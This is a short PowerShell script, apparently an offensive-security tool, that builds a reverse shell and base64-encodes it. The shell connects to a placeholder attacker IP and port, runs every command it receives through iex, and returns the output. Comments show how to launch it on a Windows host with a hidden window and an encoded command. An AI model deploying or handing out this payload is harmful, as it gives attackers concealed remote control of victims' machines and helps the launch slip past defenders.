$TEXTO = '$client = New-Object System.Net.Sockets.TCPClient("<LOCALIP>",<LOCALPORT>);$stream =$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$ENCODED1 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($TEXTO))
Write-Output $ENCODED1

#In a Windows hosts, this can be used in the following command: powershell -nop -w hidden -enc <encryptedrevshell>.
#In our Kali, this script can be runned with 'pwsh -File rev_shell_b64encoder.ps1'
